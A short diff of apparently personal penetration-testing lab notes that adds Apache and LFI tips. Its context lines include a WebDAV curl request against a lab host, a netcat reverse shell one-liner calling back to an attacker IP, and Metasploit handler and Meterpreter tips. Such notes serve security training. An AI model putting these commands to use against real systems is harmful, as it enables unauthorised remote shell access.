@@ -542,7 +542,9 @@ $ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[
 
 Apache
 * Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout
-* User agent possibly blocked? Check `httpd.config` -> change user agent to accepted one.
+* Can't access an alt HTTP(S) port (8080, 443)?
+    * User agent possibly blocked?
+    * If LFI exists, check `httpd.config` -> change user agent to accepted one.
 
 phpLiteAdmin 1.9.3 Remote PHP Code Injection:
 * https://v3ded.github.io/ctf/zico2.html
@@ -590,7 +592,6 @@ Microsoft IIS 5.0
 Reverse shell tips:
 * If a standard reverse-shell such as `nc 10.11.0.222 4444 -e /bin/bash` doesn't work, use `exploit/multi/handler` to catch the connection.
 
-Pay
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
 Meterpreter reverse-shell + usage:
